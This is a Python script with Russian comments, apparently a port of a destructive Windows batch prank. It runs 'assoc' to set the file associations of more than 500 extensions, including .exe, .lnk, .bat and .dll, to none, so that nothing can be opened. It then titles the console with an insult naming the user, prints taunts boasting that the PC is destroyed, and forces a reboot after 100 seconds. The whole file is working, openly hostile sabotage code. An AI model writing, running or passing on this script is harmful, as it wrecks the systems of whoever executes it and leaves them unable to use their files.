#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import sys
import os
import ctypes

# Полный список расширений (более 500 штук)
EXTENSIONS = [
    ".001", ".386", ".3g2", ".3ga", ".3gp", ".3gp2", ".3gpp", ".669", ".7z",
    ".8ba", ".8bc", ".8be", ".8bf", ".8bi", ".8bp", ".8bs", ".8bx", ".8by",
    ".8li", ".a52", ".AAC", ".abr", ".ac3", ".acb", ".acf", ".acl", ".aco",
    ".acrobatsecuritysettings", ".act", ".acv", ".ado", ".ADT", ".ADTS",
    ".ahs", ".ahu", ".aif", ".aifc", ".aiff", ".alv", ".amp", ".amr", ".ams",
    ".amv", ".ani", ".aob", ".ape", ".api", ".apl", ".application",
    ".appref-ms", ".arj", ".asa", ".asf", ".asl", ".asp", ".ast", ".asv",
    ".asx", ".atf", ".atn", ".au", ".ava", ".avi", ".aw", ".awf", ".axt",
    ".b4s", ".bat", ".bik", ".blg", ".bmp", ".bz", ".bz2", ".c2r", ".cab",
    ".caf", ".camp", ".cat", ".cda", ".cdmp", ".cdx", ".cer", ".cha",
    ".ChessTitansSave-ms", ".chk", ".chm", ".cmd", ".com", ".ComfyCakesSave-ms",
    ".compositefont", ".contact", ".cpl", ".crd", ".crds", ".crl", ".crt",
    ".crtx", ".csf", ".csh", ".css", ".csv", ".cue", ".cur", ".db", ".der",
    ".desklink", ".diagcab", ".diagcfg", ".diagpkg", ".dib", ".dic", ".divx",
    ".dll", ".doc", ".dochtml", ".docm", ".docmhtml", ".docx", ".docxml",
    ".dot", ".dothtml", ".dotm", ".dotx", ".dqy", ".drc", ".drv", ".dsn",
    ".dts", ".dv", ".DVR", ".dvr-ms", ".dwfx", ".easmx", ".edrwx", ".elm",
    ".emf", ".eprtx", ".eps", ".evo", ".evt", ".evtx", ".exc", ".exe", ".f4v",
    ".fdf", ".ffo", ".flac", ".flv", ".fon", ".FreeCellSave-ms", ".gadget",
    ".gcsx", ".gif", ".glox", ".gmmp", ".gqsx", ".grd", ".group", ".grp",
    ".gvi", ".gxf", ".gz", ".H1C", ".H1D", ".H1F", ".H1H", ".H1K", ".H1Q",
    ".H1S", ".H1T", ".H1V", ".H1W", ".hdd", ".HeartsSave-ms", ".hlp", ".hta",
    ".htm", ".html", ".hxa", ".hxc", ".hxd", ".hxe", ".hxf", ".hxh", ".hxi",
    ".hxk", ".hxq", ".hxr", ".hxs", ".hxt", ".hxv", ".hxw", ".icb", ".icc",
    ".icl", ".icm", ".ico", ".ifo", ".img", ".inf", ".ini", ".iqy", ".iros",
    ".irs", ".isa", ".iso", ".it", ".jar", ".jfif", ".jnlp", ".jnt", ".Job",
    ".jod", ".jpe", ".jpeg", ".jpg", ".js", ".JSE", ".jtp", ".jtx", ".key",
    ".label", ".lex", ".lha", ".library-ms", ".lnk", ".log", ".lz", ".lzh",
    ".m1v", ".m2t", ".m2ts", ".m2v", ".m3u", ".m3u8", ".m4a", ".m4p", ".m4v",
    ".MahjongTitansSave-ms", ".mapimail", ".mcl", ".mht", ".mhtml", ".mid",
    ".midi", ".mig", ".MinesweeperSave-ms", ".mka", ".mkv", ".mlc", ".mlp",
    ".mod", ".mov", ".mp1", ".mp2", ".mp2v", ".mp3", ".mp4", ".mp4v", ".mpa",
    ".mpc", ".mpe", ".mpeg", ".mpeg1", ".mpeg2", ".mpeg4", ".mpg", ".mpga",
    ".mpv2", ".msc", ".msdvd", ".msi", ".msp", ".msrcincident", ".msstyles",
    ".msu", ".mts", ".mtv", ".mxf", ".mydocs", ".nfo", ".nsv", ".nuv", ".ocx",
    ".odc", ".odccubefile", ".odcdatabasefile", ".odcnewfile",
    ".odctablecollectionfile", ".odctablefile", ".odp", ".ods", ".odt",
    ".oga", ".ogg", ".ogm", ".ogv", ".ogx", ".oma", ".opc", ".opus", ".oqy",
    ".osdx", ".otf", ".ova", ".ovf", ".p10", ".p12", ".p7b", ".p7c", ".p7m",
    ".p7r", ".p7s", ".pbk", ".pcb", ".pct", ".pdf", ".pdfxml", ".pdp", ".pdx",
    ".perfmoncfg", ".pfm", ".pfx", ".pic", ".pict", ".pif", ".pko", ".pls",
    ".pnf", ".png", ".pot", ".pothtml", ".potm", ".potx", ".ppa", ".ppam",
    ".pps", ".ppsm", ".ppsx", ".ppt", ".ppthtml", ".pptm", ".pptmhtml",
    ".pptx", ".pptxml", ".prf", ".printerExport", ".ps1", ".ps1xml", ".psc1",
    ".psd", ".psd1", ".psf", ".psm1", ".psp", ".PurblePairsSave-ms",
    ".PurbleShopSave-ms", ".pwz", ".pxr", ".qcp", ".qds", ".r00", ".r01",
    ".r02", ".r03", ".r04", ".r05", ".r06", ".r07", ".r08", ".r09", ".r10",
    ".r11", ".r12", ".r13", ".r14", ".r15", ".r16", ".r17", ".r18", ".r19",
    ".r20", ".r21", ".r22", ".r23", ".r24", ".r25", ".r26", ".r27", ".r28",
    ".r29", ".ra", ".ram", ".rar", ".rat", ".raw", ".RDP", ".rec", ".reg",
    ".rels", ".resmoncfg", ".rev", ".rle", ".rll", ".rm", ".rmi", ".rmvb",
    ".rpl", ".rqy", ".rtf", ".s3m", ".scf", ".scp", ".scr", ".sct", ".sdp",
    ".search-ms", ".searchConnector-ms", ".secstore", ".sfcache", ".shc",
    ".sldm", ".sldx", ".slk", ".slupkg-ms", ".snd", ".SolitaireSave-ms",
    ".spc", ".SpiderSolitaireSave-ms", ".spx", ".sst", ".stl", ".sys", ".tar",
    ".taz", ".tbz", ".tbz2", ".tga", ".tgz", ".theme", ".themepack", ".thmx",
    ".thp", ".tif", ".tiff", ".tlz", ".tod", ".tp", ".tpl", ".ts", ".tta",
    ".ttc", ".ttf", ".tts", ".txt", ".txz", ".UDL", ".URL", ".uu", ".uue",
    ".uxdc", ".VBE", ".vbox", ".vbox-extpack", ".vbs", ".vcf", ".vda", ".vdi",
    ".vhd", ".vlc", ".vmdk", ".vob", ".voc", ".vqf", ".vro", ".vst", ".vxd",
    ".w64", ".wab", ".wav", ".wax", ".wbcat", ".wbk", ".wbmp", ".wcx", ".wdp",
    ".webm", ".webpnp", ".wiz", ".wll", ".wm", ".wma", ".WMD", ".wmdb", ".wmf",
    ".WMS", ".wmv", ".wmx", ".wmz", ".wpl", ".wsc", ".WSF", ".WSH", ".wsp",
    ".WTV", ".wtx", ".wv", ".wve", ".wvx", ".xa", ".xaml", ".xbap", ".xdp",
    ".xesc", ".xevgenxml", ".xfdf", ".xla", ".xlam", ".xld", ".xlk", ".xll",
    ".xlm", ".xls", ".xlsb", ".xlshtml", ".xlsm", ".xlsmhtml", ".xlsx",
    ".xlt", ".xlthtml", ".xltm", ".xltx", ".xlw", ".xlxml", ".xm", ".xml",
    ".xmp", ".xps", ".xrm-ms", ".xsl", ".xspf", ".xxe", ".xz", ".z",
    ".zfsendtotarget", ".zip", ".zipx", ".zpl"
]

def is_admin():
    """Проверка, запущен ли скрипт с правами администратора (Windows)."""
    try:
        return os.getuid() == 0  # Для Unix, здесь не сработает
    except AttributeError:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0

def reset_associations():
    """Сброс ассоциаций для всех расширений из списка."""
    print("[*] Сбрасываем ассоциации файлов...")
    success_count = 0
    error_count = 0
    for ext in EXTENSIONS:
        try:
            # Выполняем assoc .ext=none, подавляя вывод
            subprocess.run(f"assoc {ext}=none", shell=True,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           check=True)
            success_count += 1
        except subprocess.CalledProcessError:
            error_count += 1
    print(f"[+] Обработано расширений: {success_count}, ошибок: {error_count}.")

def setup_console():
    """Настройка внешнего вида консоли (как в оригинальном batch)."""
    # Очистка экрана
    subprocess.run("cls", shell=True)
    # Заголовок окна
    username = os.environ.get("USERNAME", "Unknown")
    subprocess.run(f"title {username} you are an big Idiot!", shell=True)
    # Размер окна 40x20
    subprocess.run("mode 40,20", shell=True)
    # Цвет 0b (синий фон, голубой текст)
    subprocess.run("color 0b", shell=True)

def print_messages():
    """Вывод оскорбительных сообщений."""
    print("\n" * 2)
    print("." * 40)
    print("\n" * 2)
    print("    You're such an Idiot, ain't you!!")
    print("\n" * 2)
    print("    I Destroyed Your PC Baby.....")
    print("\n" * 2)
    print("   Now you won't able to open anything.")
    print("\n" * 2)
    print("........................Enjoy...........")
    print("     HA HA HA HAA HAAA HAAAA")

def schedule_reboot():
    """Запланировать перезагрузку через 100 секунд."""
    try:
        subprocess.run(["shutdown", "/r", "/f", "/t", "100"], check=True, shell=True)
        print("[*] Перезагрузка запланирована через 100 секунд.")
    except subprocess.CalledProcessError as e:
        print(f"[-] Не удалось выполнить перезагрузку: {e}", file=sys.stderr)

def main():
    if not is_admin():
        print("Внимание: скрипт не запущен от имени администратора.", file=sys.stderr)
        print("Изменение ассоциаций файлов может не сработать.", file=sys.stderr)
        # Можно спросить, продолжать ли
        choice = input("Продолжить всё равно? (y/n): ").lower()
        if choice != 'y':
            sys.exit(0)

    setup_console()
    reset_associations()
    print_messages()
    schedule_reboot()
    input("Press any key to continue...")

if __name__ == "__main__":
    main()